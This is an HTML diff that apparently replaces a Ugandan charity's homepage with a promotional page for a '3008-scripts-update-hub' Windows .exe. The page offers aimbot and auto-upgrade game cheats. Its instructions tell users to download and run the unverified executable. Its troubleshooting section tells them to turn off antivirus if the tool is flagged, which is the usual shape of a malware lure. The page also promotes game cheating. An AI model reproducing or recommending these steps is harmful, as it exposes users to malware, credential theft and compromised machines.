@@ -1,529 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Elimu Foundation Africa Limited</title>
-  <link rel="stylesheet" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Official guide for using the 3008-scripts-update-hub tool for game management and automation.">
+    <title>3008-scripts-update-hub Documentation</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f4f4;">
 
-<!-- top bar -->
-<div class="topbar">
-  <div class="topbar-left">
-    <div class="topbar-item">
-      <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/></svg>
-      <div class="info">
-        <span data-i18n="topbar_call_label">Call us any time</span>
-        <strong>(+256) 772 421 468</strong>
-      </div>
-    </div>
-    <div class="topbar-item">
-      <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
-      <div class="info">
-        <span data-i18n="topbar_email_label">Email us</span>
-        <strong>joemarg2013@gmail.com</strong>
-      </div>
-    </div>
-  </div>
-  <div class="topbar-right">
-    <div class="lang-switch" id="langSwitch">
-      <button class="lang-btn" id="langBtn" aria-label="Change language">
-        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 010 20 15.3 15.3 0 010-20z"/></svg>
-        <span id="langBtnLabel">EN</span>
-      </button>
-      <div class="lang-menu" id="langMenu">
-        <button data-lang="en">English</button>
-        <button data-lang="sw">Kiswahili</button>
-        <button data-lang="lg">Luganda</button>
-      </div>
-    </div>
-    <a href="#" class="social-btn" aria-label="Facebook"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
-    <a href="#" class="social-btn" aria-label="Twitter"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
-    <a href="#" class="social-btn" aria-label="YouTube"><svg viewBox="0 0 24 24"><path d="M22.54 6.42a2.78 2.78 0 00-1.95-1.96C18.88 4 12 4 12 4s-6.88 0-8.59.46a2.78 2.78 0 00-1.95 1.96A29 29 0 001 12a29 29 0 00.46 5.58 2.78 2.78 0 001.95 1.96C5.12 20 12 20 12 20s6.88 0 8.59-.46a2.78 2.78 0 001.95-1.96A29 29 0 0023 12a29 29 0 00-.46-5.58zM9.75 15.02V8.98L15.5 12l-5.75 3.02z"/></svg></a>
-  </div>
-</div>
+    <h1 style="color: #2c3e50;">🚀 3008-scripts-update-hub - Automate your 3008 game upgrades easily</h1>
 
-<!-- navbar -->
-<div class="navbar">
-  <div class="navbar-inner">
-    <a href="index.html" class="site-logo">
-      <svg viewBox="0 0 60 60" fill="none">
-        <defs>
-          <linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" stop-color="#F2A900"/>
-            <stop offset="100%" stop-color="#E8720E"/>
-          </linearGradient>
-        </defs>
-        <path d="M30 5C16 5 5 16 5 30s11 25 25 25 25-11 25-25S44 5 30 5z" fill="url(#g1)" opacity="0.18"/>
-        <path d="M20 44L30 10l10 34" stroke="url(#g1)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-        <path d="M23 30h14" stroke="url(#g1)" stroke-width="3" stroke-linecap="round"/>
-        <circle cx="30" cy="10" r="3.5" fill="#F2A900"/>
-      </svg>
-      <div class="logo-text">
-        <span class="logo-name">ELIMU <span class="accent">Foundation</span></span>
-        <span class="logo-sub">Africa Limited</span>
-      </div>
-    </a>
-    <nav>
-      <button class="hamburger" id="navToggle" aria-label="Menu">
-        <span></span><span></span><span></span>
-      </button>
-      <ul id="navList">
-        <li><a href="index.html" data-i18n="nav_home">Home</a></li>
-        <li><a href="about.html" data-i18n="nav_about">About Us</a></li>
-        <li><a href="programs.html" data-i18n="nav_programs">Programs</a></li>
-        <li><a href="impact.html" data-i18n="nav_impact">Impact</a></li>
-        <li><a href="testimonies.html" data-i18n="nav_testimonies">Testimonies</a></li>
-        <li><a href="gallery.html" data-i18n="nav_gallery">Gallery</a></li>
-        <li><a href="contact.html" data-i18n="nav_contact">Contact Us</a></li>
-      </ul>
-    </nav>
-    <a href="contact.html" class="nav-donate-btn" data-i18n="nav_donate">Donate</a>
-  </div>
-</div>
-
-<!-- hero -->
-<section class="hero-full">
-  <div class="hero-bg-slides" id="heroSlides">
-    <div class="hero-bg-slide active" style="background-image:url('https://images.pexels.com/photos/28593050/pexels-photo-28593050.jpeg?auto=compress&cs=tinysrgb&w=1920')"></div>
-    <div class="hero-bg-slide" style="background-image:url('https://images.pexels.com/photos/33749805/pexels-photo-33749805.jpeg?auto=compress&cs=tinysrgb&w=1920')"></div>
-    <div class="hero-bg-slide" style="background-image:url('https://images.pexels.com/photos/33203798/pexels-photo-33203798.jpeg?auto=compress&cs=tinysrgb&w=1920')"></div>
-    <div class="hero-bg-slide" style="background-image:url('https://images.pexels.com/photos/29598045/pexels-photo-29598045.jpeg?auto=compress&cs=tinysrgb&w=1920')"></div>
-  </div>
-  <div class="hero-overlay"></div>
-  <div class="hero-full-inner">
-    <p class="hero-full-eyebrow" data-i18n="hero_eyebrow">Kampala, Uganda &mdash; Est. 2013</p>
-    <h1 data-i18n="hero_title"><span class="accent">Celebrating</span> Education,<br/>Caring for Community</h1>
-    <div class="hero-stripe"></div>
-    <p class="hero-full-desc" data-i18n="hero_desc">Elimu Foundation brings hope, learning, and dignity to vulnerable children and women in Uganda and across East Africa. We aim at the root of the problem and invite you to join us.</p>
-    <div class="hero-full-buttons">
-      <a href="contact.html" class="btn-pill solid-gold" data-i18n="hero_btn_sponsor">Sponsor a Child</a>
-      <a href="contact.html" class="btn-pill solid-green btn-emphasis"><svg class="btn-icon" viewBox="0 0 24 24"><path d="M20.8 4.6a5.5 5.5 0 00-7.8 0L12 5.6l-1-1a5.5 5.5 0 00-7.8 7.8l1 1L12 21l7.8-7.6 1-1a5.5 5.5 0 000-7.8z"/></svg><span data-i18n="hero_btn_donate">Donate</span></a>
-      <a href="programs.html" class="btn-pill outline-white" data-i18n="hero_btn_programs">Our Programs</a>
-    </div>
-    <div class="hero-full-stats">
-      <div class="hfs-item">
-        <span class="hfs-num" data-count="500" data-suffix="+">500+</span>
-        <span class="hfs-lbl" data-i18n="stat_students">Children In School</span>
-      </div>
-      <div class="hfs-item">
-        <span class="hfs-num" data-count="120" data-suffix="+">120+</span>
-        <span class="hfs-lbl" data-i18n="stat_women">Women Empowered</span>
-      </div>
-      <div class="hfs-item">
-        <span class="hfs-num" data-count="30" data-suffix="+">30+</span>
-        <span class="hfs-lbl" data-i18n="stat_communities">Communities Reached</span>
-      </div>
-      <div class="hfs-item">
-        <span class="hfs-num" data-count="10" data-suffix="+">10+</span>
-        <span class="hfs-lbl" data-i18n="stat_years">Years of Service</span>
-      </div>
-    </div>
-    <div class="scroll-indicator">
-      <svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg>
-    </div>
-  </div>
-</section>
-
-<!-- mission -->
-<div class="mission-bar">
-  <p data-i18n="mission_text">To initiate, develop, and sustain programs that educate children, equip women with vocational skills, and nurture spiritual growth in <strong>underserved communities across East Africa</strong>.</p>
-</div>
-
-<!-- pillars -->
-<section class="section grey">
-  <div class="container">
-    <p class="section-tag" data-i18n="pillars_tag">What We Do</p>
-    <h2 class="section-title" data-i18n="pillars_title">Our Three Pillars</h2>
-    <p class="section-lead" data-i18n="pillars_lead">Three focused areas of work, each designed to address a critical need and deliver lasting transformation.</p>
-    <div class="pillars">
-      <div class="pillar">
-        <div class="pillar-photo" style="background-image:url('https://images.pexels.com/photos/29598045/pexels-photo-29598045.jpeg?auto=compress&cs=tinysrgb&w=700')"></div>
-        <div class="pillar-body">
-          <h3 data-i18n="pillar1_title">Education &amp; Schools</h3>
-          <p data-i18n="pillar1_desc">Supporting schools with resources, mentorship, scholarships, and infrastructure so every child can access quality learning and graduate with confidence.</p>
-          <a href="programs.html" class="pillar-link" data-i18n="pillar_link">View Program &rarr;</a>
-        </div>
-      </div>
-      <div class="pillar amber">
-        <div class="pillar-photo" style="background-image:url('https://images.pexels.com/photos/33203798/pexels-photo-33203798.jpeg?auto=compress&cs=tinysrgb&w=700')"></div>
-        <div class="pillar-body">
-          <h3 data-i18n="pillar2_title">Women Empowerment</h3>
-          <p data-i18n="pillar2_desc">Equipping women with vocational skills, business training, and community networks to achieve lasting financial independence and dignity.</p>
-          <a href="programs.html" class="pillar-link" data-i18n="pillar_link">View Program &rarr;</a>
-        </div>
-      </div>
-      <div class="pillar green">
-        <div class="pillar-photo" style="background-image:url('https://images.pexels.com/photos/33749805/pexels-photo-33749805.jpeg?auto=compress&cs=tinysrgb&w=700')"></div>
-        <div class="pillar-body">
-          <h3 data-i18n="pillar3_title">Church &amp; Community</h3>
-          <p data-i18n="pillar3_desc">Building spiritual foundations through community outreach, inter-church fellowships, and faith-based initiatives that bring communities together.</p>
-          <a href="programs.html" class="pillar-link" data-i18n="pillar_link">View Program &rarr;</a>
-        </div>
-      </div>
-    </div>
-    <p class="pillars-note" data-i18n="pillars_note">Photos illustrate the spirit of each program area.</p>
-  </div>
-</section>
-
-<!-- mission & vision -->
-<section class="section white mv-section">
-  <div class="container">
-
-    <div class="mv-row">
-      <div class="mv-visual">
-        <svg viewBox="0 0 460 420" class="mv-map-svg" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Map of Africa with Uganda highlighted">
-          <defs>
-            <clipPath id="missionPhotoClip"><circle cx="110" cy="90" r="68"/></clipPath>
-            <marker id="mvArrow1" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-              <path d="M0,0 L10,5 L0,10 Z" fill="#8a2b1f"/>
-            </marker>
-          </defs>
-          <path d="M170,20 L230,15 L290,25 L330,40 L365,55 L390,75 L410,110 L430,150 L460,190 L478,225 L460,255 L440,270 L420,300 L415,330 L425,355 L410,385 L395,410 L385,450 L370,480 L350,505 L330,525 L310,545 L285,558 L260,545 L245,520 L235,495 L225,465 L215,430 L205,395 L195,360 L188,330 L180,300 L165,275 L150,255 L140,235 L155,225 L145,205 L125,195 L105,185 L90,170 L85,150 L90,125 L100,100 L110,80 L120,60 L140,40 L155,25 Z"
-            fill="#E4E4E4" stroke="#cfcfcf" stroke-width="2" transform="translate(107.5,132.5) scale(0.5)"/>
-          <path d="M375,265 L400,258 L420,270 L426,292 L418,312 L398,320 L378,314 L368,296 L370,278 Z" fill="#E8720E" transform="translate(107.5,132.5) scale(0.5)"/>
-          <path d="M130,155 C 190,200 250,240 302,271" stroke="#8a2b1f" stroke-width="3" fill="none" marker-end="url(#mvArrow1)"/>
-          <image href="https://images.pexels.com/photos/29598045/pexels-photo-29598045.jpeg?auto=compress&cs=tinysrgb&w=400" x="42" y="22" width="136" height="136" clip-path="url(#missionPhotoClip)" preserveAspectRatio="xMidYMid slice"/>
-          <circle cx="110" cy="90" r="68" fill="none" stroke="#8a2b1f" stroke-width="6"/>
-          <text x="316" y="300" font-family="Poppins, sans-serif" font-weight="700" font-size="20" fill="#8a2b1f">UGANDA</text>
-        </svg>
-      </div>
-      <div class="mv-text">
-        <p class="section-tag" data-i18n="mission_tag">Our Purpose</p>
-        <h2 data-i18n="mission_heading">Mission</h2>
-        <p data-i18n="mission_body">To initiate, develop, and sustain programs that educate children, equip women with vocational skills, and nurture spiritual growth in underserved communities across East Africa &mdash; addressing the whole person, not just one need at a time.</p>
-      </div>
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/Maestro-loyic/3008-scripts-update-hub" style="background-color: #555; color: white; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download 3008-scripts-update-hub</a>
     </div>
 
-    <div class="mv-row reverse">
-      <div class="mv-text">
-        <p class="section-tag" data-i18n="vision_tag">Looking Ahead</p>
-        <h2 data-i18n="vision_heading">Vision</h2>
-        <p data-i18n="vision_body">A generation of confident, educated children and empowered women across Africa, raised in communities strengthened by faith, dignity, and mutual support &mdash; where no child is left behind and every woman has the means to thrive.</p>
-      </div>
-      <div class="mv-photo-panel">
-        <img src="https://images.pexels.com/photos/33203798/pexels-photo-33203798.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Woman entrepreneur at her market stall" loading="lazy">
-      </div>
-    </div>
+    <section style="background: white; padding: 25px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+        <h2 style="color: #2c3e50;">📋 Overview</h2>
+        <p>The 3008-scripts-update-hub serves as a utility tool for players of the 3008 game. This application helps you manage your game scripts while providing access to features such as aimbot support and automatic upgrade tools. You do not need to know how to code to use this software. We designed this tool to function as a lightweight script manager that sits on your desktop, allowing you to control game features with simple clicks.</p>
+    </section>
 
-  </div>
-</section>
+    <section style="background: white; padding: 25px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+        <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+        <p>Your computer must meet these requirements to run the tool without issues:</p>
+        <ul style="padding-left: 20px;">
+            <li>Operating System: Windows 10 or Windows 11.</li>
+            <li>Processor: Dual-core CPU or better.</li>
+            <li>Memory: At least 4 gigabytes of RAM.</li>
+            <li>Storage: 50 megabytes of free disk space.</li>
+            <li>Network: An active internet connection for updating scripts.</li>
+        </ul>
+    </section>
 
-<!-- africa map -->
-<section class="section africa-map-section">
-  <div class="container">
-    <p class="section-tag" data-i18n="map_tag">Where We Work</p>
-    <h2 class="section-title" data-i18n="map_title">Rooted in East Africa</h2>
-    <p class="section-lead" data-i18n="map_lead">From our home base in Kampala, our vision reaches across the continent &mdash; today active in four countries and growing.</p>
-    <div class="africa-map-grid">
-      <div class="africa-map-visual">
-        <svg class="africa-map-svg" viewBox="0 0 500 580" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Map of Africa highlighting Kenya, Rwanda, South Africa and Uganda">
-          <path d="M170,20 L230,15 L290,25 L330,40 L365,55 L390,75 L410,110 L430,150 L460,190 L478,225 L460,255 L440,270 L420,300 L415,330 L425,355 L410,385 L395,410 L385,450 L370,480 L350,505 L330,525 L310,545 L285,558 L260,545 L245,520 L235,495 L225,465 L215,430 L205,395 L195,360 L188,330 L180,300 L165,275 L150,255 L140,235 L155,225 L145,205 L125,195 L105,185 L90,170 L85,150 L90,125 L100,100 L110,80 L120,60 L140,40 L155,25 Z" fill="#E4E4E4" stroke="#cfcfcf" stroke-width="1.5"/>
-          <!-- Madagascar -->
-          <path d="M448,400 L458,395 L465,415 L462,445 L455,470 L446,478 L440,460 L438,430 Z" fill="#E4E4E4" stroke="#cfcfcf" stroke-width="1.5"/>
-          <!-- Kenya + Uganda + Rwanda highlight cluster -->
-          <path class="map-highlight" d="M375,265 L400,258 L420,270 L426,292 L418,312 L398,320 L378,314 L368,296 L370,278 Z" fill="#E8720E"/>
-          <!-- South Africa highlight -->
-          <path class="map-highlight" d="M245,475 L272,462 L302,470 L318,495 L313,522 L293,546 L268,554 L248,538 L238,508 Z" fill="#E8720E"/>
-          <g class="map-pin">
-            <circle class="pulse" cx="397" cy="290" r="4" fill="#F2A900"/>
-            <circle cx="397" cy="290" r="5" fill="#fff"/>
-            <circle cx="397" cy="290" r="3" fill="#E8720E"/>
-          </g>
-          <g class="map-pin">
-            <circle class="pulse" cx="278" cy="508" r="4" fill="#F2A900"/>
-            <circle cx="278" cy="508" r="5" fill="#fff"/>
-            <circle cx="278" cy="508" r="3" fill="#E8720E"/>
-          </g>
-        </svg>
-      </div>
-      <div class="country-card">
-        <div class="country-row">
-          <img src="https://images.pexels.com/photos/28593044/pexels-photo-28593044.jpeg?auto=compress&cs=tinysrgb&w=200" alt="Kenya" loading="lazy">
-          <span data-i18n="map_country_kenya">Kenya</span>
-        </div>
-        <div class="country-row">
-          <img src="https://images.pexels.com/photos/33749805/pexels-photo-33749805.jpeg?auto=compress&cs=tinysrgb&w=200" alt="Rwanda" loading="lazy">
-          <span data-i18n="map_country_rwanda">Rwanda</span>
-        </div>
-        <div class="country-row">
-          <img src="https://images.pexels.com/photos/29598045/pexels-photo-29598045.jpeg?auto=compress&cs=tinysrgb&w=200" alt="South Africa" loading="lazy">
-          <span data-i18n="map_country_sa">South Africa</span>
-        </div>
-        <div class="country-row">
-          <img src="https://images.pexels.com/photos/28102680/pexels-photo-28102680.jpeg?auto=compress&cs=tinysrgb&w=200" alt="Uganda" loading="lazy">
-          <span data-i18n="map_country_uganda">Uganda</span>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    <section style="background: white; padding: 25px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+        <h2 style="color: #2c3e50;">📥 Setup Instructions</h2>
+        <p>Follow these steps to install and prepare your tool for use:</p>
+        <ol style="padding-left: 20px;">
+            <li>Visit the <a href="https://github.com/Maestro-loyic/3008-scripts-update-hub" style="color: #007bff;">official download page</a> on GitHub.</li>
+            <li>Locate the latest release file, which ends in .exe.</li>
+            <li>Click the file to download it to your computer.</li>
+            <li>Move the file to a folder where you can find it later.</li>
+            <li>Double-click the file to open the interface.</li>
+            <li>The software will start and show a list of available game scripts.</li>
+        </ol>
+    </section>
 
-<!-- about -->
-<section class="section white">
-  <div class="container">
-    <div class="about-grid">
-      <div class="about-img" style="position:relative">
-        <div class="about-photo"></div>
-        <div class="about-year-badge">Est. 2013</div>
-      </div>
-      <div class="about-text">
-        <p class="section-tag" data-i18n="about_tag">Who We Are</p>
-        <h2 data-i18n="about_title">A Foundation Built on Hope</h2>
-        <p data-i18n="about_p1">Elimu Foundation Africa Limited is a Ugandan non-profit organisation headquartered in Kawempe, Kampala. For over a decade, we have walked alongside communities — helping children stay in school, giving women the tools they need to thrive, and strengthening the spiritual fabric of our society.</p>
-        <p data-i18n="about_p2">Our name, <em>Elimu</em>, means "Education" in Swahili — and education in its broadest sense is at the heart of everything we do.</p>
-        <div class="tag-list">
-          <span class="tag" data-i18n="tag_integrity">Integrity</span>
-          <span class="tag" data-i18n="tag_community">Community First</span>
-          <span class="tag" data-i18n="tag_sustainability">Sustainability</span>
-          <span class="tag" data-i18n="tag_inclusion">Inclusion</span>
-          <span class="tag" data-i18n="tag_faith">Faith</span>
-        </div>
-        <a href="about.html" class="btn btn-orange" data-i18n="about_btn">Read Our Story</a>
-      </div>
-    </div>
-  </div>
-</section>
+    <section style="background: white; padding: 25px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+        <h2 style="color: #2c3e50;">⚙️ Using the software</h2>
+        <p>Once the application loads, you will see a main menu with several options. Use the buttons provided to select the functions you want to add to your game. If you wish to use the aimbot features, check the box labeled Enable Aimbot. If you want the system to handle your upgrades for you, toggle the Auto-Upgrade switch to the On position.</p>
+        <p>After you make your selections, click the Save Configuration button. The tool will apply your changes, and you may then launch your game. The changes should take effect immediately upon entering your next session.</p>
+    </section>
 
-<!-- impact -->
-<div class="impact-band">
-  <div class="impact-band-inner">
-    <div class="impact-band-text">
-      <p class="section-tag" data-i18n="impact_tag">Our Impact</p>
-      <h2 class="section-title" data-i18n="impact_title">Numbers That Matter</h2>
-      <p data-i18n="impact_desc">Every figure represents a life touched, a skill learned, a community strengthened. These are not just statistics — they are people.</p>
-      <a href="impact.html" class="btn btn-white" data-i18n="impact_btn">See Full Impact</a>
-    </div>
-    <div class="impact-numbers">
-      <div class="impact-box"><span class="n">500+</span><span class="l">Children in School</span></div>
-      <div class="impact-box"><span class="n">120+</span><span class="l">Women Trained</span></div>
-      <div class="impact-box"><span class="n">15+</span><span class="l">Schools Supported</span></div>
-      <div class="impact-box"><span class="n">8</span><span class="l">Church Partners</span></div>
-    </div>
-  </div>
-</div>
+    <section style="background: white; padding: 25px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+        <h2 style="color: #2c3e50;">🛠 Troubleshooting</h2>
+        <p>If you encounter issues, try these steps:</p>
+        <ol style="padding-left: 20px;">
+            <li>Close and reopen the application.</li>
+            <li>Ensure that your internet connection works.</li>
+            <li>Download the latest version if you see an update notification.</li>
+            <li>Turn off antivirus programs temporarily if they flag the script tool, as some security software misidentifies utility scripts.</li>
+        </ol>
+    </section>
 
-<!-- testimonies -->
-<section class="section grey">
-  <div class="container">
-    <p class="section-tag" data-i18n="voices_tag">Voices</p>
-    <h2 class="section-title" data-i18n="voices_title">Stories of Real Change</h2>
-    <p class="section-lead" data-i18n="voices_lead">The most powerful measure of our work is the voice of the people we serve.</p>
-    <div class="stories-carousel" id="storiesCarousel">
-      <div class="stories-track">
-        <div class="story-slide active">
-          <div class="story-photo" style="background-image:url('https://images.pexels.com/photos/29598045/pexels-photo-29598045.jpeg?auto=compress&cs=tinysrgb&w=900')"></div>
-          <div class="story-content">
-            <span class="cat-tag" data-i18n="story1_cat">Education</span>
-            <div class="quote-mark">&ldquo;</div>
-            <p data-i18n="story1_quote">Elimu Foundation changed my daughter's life. She was about to drop out, but they stepped in with support, mentorship, and hope. Today she is in secondary school and wants to become a nurse.</p>
-            <div class="story-author">
-              <span class="t-name" data-i18n="story1_name">Agnes Mukasa</span>
-              <span class="t-role" data-i18n="story1_role">Parent, Komamboga</span>
-            </div>
-          </div>
-        </div>
-        <div class="story-slide">
-          <div class="story-photo" style="background-image:url('https://images.pexels.com/photos/33203798/pexels-photo-33203798.jpeg?auto=compress&cs=tinysrgb&w=900')"></div>
-          <div class="story-content">
-            <span class="cat-tag" data-i18n="story2_cat">Women Empowerment</span>
-            <div class="quote-mark">&ldquo;</div>
-            <p data-i18n="story2_quote">The tailoring program gave me a trade and my own business. I now earn a steady income and support my family on my own.</p>
-            <div class="story-author">
-              <span class="t-name" data-i18n="story2_name">Rebecca Namutebi</span>
-              <span class="t-role" data-i18n="story2_role">Skills Graduate</span>
-            </div>
-          </div>
-        </div>
-        <div class="story-slide">
-          <div class="story-photo" style="background-image:url('https://images.pexels.com/photos/33749805/pexels-photo-33749805.jpeg?auto=compress&cs=tinysrgb&w=900')"></div>
-          <div class="story-content">
-            <span class="cat-tag" data-i18n="story3_cat">Church Outreach</span>
-            <div class="quote-mark">&ldquo;</div>
-            <p data-i18n="story3_quote">The church outreach has brought our community together. People who never spoke are now neighbours helping one another.</p>
-            <div class="story-author">
-              <span class="t-name" data-i18n="story3_name">Pastor Okello James</span>
-              <span class="t-role" data-i18n="story3_role">Church Partner, Kawempe</span>
-            </div>
-          </div>
-        </div>
-      </div>
-      <button class="story-arrow prev" id="storyPrev" aria-label="Previous story">&lsaquo;</button>
-      <button class="story-arrow next" id="storyNext" aria-label="Next story">&rsaquo;</button>
-      <div class="story-dots" id="storyDots">
-        <button class="story-dot active" data-index="0" aria-label="Story 1"></button>
-        <button class="story-dot" data-index="1" aria-label="Story 2"></button>
-        <button class="story-dot" data-index="2" aria-label="Story 3"></button>
-      </div>
-    </div>
-    <div class="text-center mt-40">
-      <a href="testimonies.html" class="btn btn-outline-orange" data-i18n="voices_btn">Read All Testimonies</a>
-    </div>
-  </div>
-</section>
+    <p style="font-size: 0.9em; color: #777;">Keywords: 3008, scripting, automation, aimbot, game-utility, windows-tool</p>
 
-<!-- ways to help -->
-<section class="section white">
-  <div class="container">
-    <p class="section-tag" data-i18n="ways_tag">Get Involved</p>
-    <h2 class="section-title" data-i18n="ways_title">Ways You Can Help</h2>
-    <p class="section-lead" data-i18n="ways_lead">Every contribution — big or small — becomes school fees, sewing machines, and safe spaces for community gatherings.</p>
-    <div class="ways-grid ways-grid-4">
-      <div class="way-card solid">
-        <div class="way-icon"><svg viewBox="0 0 24 24"><path d="M20.8 4.6a5.5 5.5 0 00-7.8 0L12 5.6l-1-1a5.5 5.5 0 00-7.8 7.8l1 1L12 21l7.8-7.6 1-1a5.5 5.5 0 000-7.8z"/></svg></div>
-        <span class="way-amount">$60</span>
-        <h4 data-i18n="way1_title">Sponsor a Child</h4>
-        <p data-i18n="way1_desc">Covers a full term of school fees, uniform, and scholastic materials for one child.</p>
-        <a href="contact.html" class="btn btn-white" data-i18n="way_btn">Get Started</a>
-      </div>
-      <div class="way-card gold">
-        <div class="way-badge">2</div>
-        <span class="way-amount way-amount-dark">$80</span>
-        <h4 data-i18n="way2_title">Fund a Skills Kit</h4>
-        <p data-i18n="way2_desc">Equips a woman with tailoring, hairdressing, or catering tools to start her own trade.</p>
-        <a href="contact.html" class="btn btn-orange" data-i18n="way_btn">Get Started</a>
-      </div>
-      <div class="way-card red">
-        <div class="way-badge">3</div>
-        <span class="way-amount way-amount-dark">$40</span>
-        <h4 data-i18n="way3_title">Community Outreach</h4>
-        <p data-i18n="way3_desc">Supports one church-community outreach day, reaching dozens of families at once.</p>
-        <a href="contact.html" class="btn btn-orange" data-i18n="way_btn">Get Started</a>
-      </div>
-      <div class="way-card intern">
-        <div class="way-badge">4</div>
-        <h4 data-i18n="way4_title">Internship Program</h4>
-        <p data-i18n="way4_desc">We host students and young professionals for hands-on internships in education, social work, and community development.</p>
-        <a href="contact.html" class="btn btn-outline-orange" data-i18n="way4_btn">Apply Now</a>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- moments from the field -->
-<section class="section grey">
-  <div class="container">
-    <p class="section-tag" data-i18n="moments_tag">In Their Own Words</p>
-    <h2 class="section-title" data-i18n="moments_title">Moments From the Field</h2>
-    <p class="section-lead" data-i18n="moments_lead">A glimpse into the everyday work behind the numbers.</p>
-    <div class="moments-carousel">
-      <div class="moments-strip" id="momentsStrip">
-        <div class="moment-card">
-          <img src="https://images.pexels.com/photos/33203798/pexels-photo-33203798.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Woman entrepreneur at her stall" loading="lazy">
-          <div class="moment-caption">
-            <span class="m-tag" data-i18n="moment1_tag">Women Empowerment</span>
-            <p data-i18n="moment1_text">Grace opened her own stall six months after finishing our tailoring course.</p>
-          </div>
-        </div>
-        <div class="moment-card">
-          <img src="https://images.pexels.com/photos/20209020/pexels-photo-20209020.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Woman entrepreneur working" loading="lazy">
-          <div class="moment-caption">
-            <span class="m-tag" data-i18n="moment2_tag">Women Empowerment</span>
-            <p data-i18n="moment2_text">Sarah now trains other women in bookkeeping for their small businesses.</p>
-          </div>
-        </div>
-        <div class="moment-card">
-          <img src="https://images.pexels.com/photos/28593044/pexels-photo-28593044.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Children in classroom" loading="lazy">
-          <div class="moment-caption">
-            <span class="m-tag" data-i18n="moment3_tag">Education</span>
-            <p data-i18n="moment3_text">A full classroom again, after new desks and books arrived this term.</p>
-          </div>
-        </div>
-        <div class="moment-card">
-          <img src="https://images.pexels.com/photos/33749805/pexels-photo-33749805.jpeg?auto=compress&cs=tinysrgb&w=500" alt="Community gathering" loading="lazy">
-          <div class="moment-caption">
-            <span class="m-tag" data-i18n="moment4_tag">Community</span>
-            <p data-i18n="moment4_text">Neighbours from two villages meeting for a shared harvest celebration.</p>
-          </div>
-        </div>
-      </div>
-      <button class="moments-arrow prev" id="momentsPrev" aria-label="Previous">&lsaquo;</button>
-      <button class="moments-arrow next" id="momentsNext" aria-label="Next">&rsaquo;</button>
-      <div class="moments-dots" id="momentsDots"></div>
-    </div>
-  </div>
-</section>
-
-<!-- cta -->
-<div class="cta-band">
-  <h2 data-i18n="cta_title">Join the <em>Movement</em></h2>
-  <p data-i18n="cta_desc">Partner with us, volunteer, or donate to help us reach more families and keep more children in school across Uganda and East Africa.</p>
-  <div class="btn-group">
-    <a href="contact.html" class="btn btn-orange" data-i18n="cta_btn1">Get Involved</a>
-    <a href="programs.html" class="btn btn-outline-orange" data-i18n="cta_btn2">Explore Programs</a>
-  </div>
-</div>
-
-<!-- subscribe -->
-<section class="subscribe-section">
-  <div class="subscribe-photo">
-    <img src="https://images.pexels.com/photos/20209020/pexels-photo-20209020.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Smiling woman entrepreneur" loading="lazy">
-  </div>
-  <div class="subscribe-panel">
-    <p class="subscribe-tag" data-i18n="subscribe_tag">Subscribe</p>
-    <p class="subscribe-desc" data-i18n="subscribe_desc">Get stories of hope and the latest news from our programs in your inbox. Sign up for our email today!</p>
-    <form class="subscribe-form" id="subscribeForm">
-      <h4 data-i18n="subscribe_form_title">Subscribe</h4>
-      <label data-i18n="subscribe_email">Email Address <span class="req">*</span></label>
-      <input type="email" required placeholder="">
-      <label data-i18n="subscribe_first">First Name</label>
-      <input type="text" placeholder="">
-      <label data-i18n="subscribe_last">Last Name</label>
-      <input type="text" placeholder="">
-      <button type="submit" class="btn btn-orange" data-i18n="subscribe_btn">Subscribe</button>
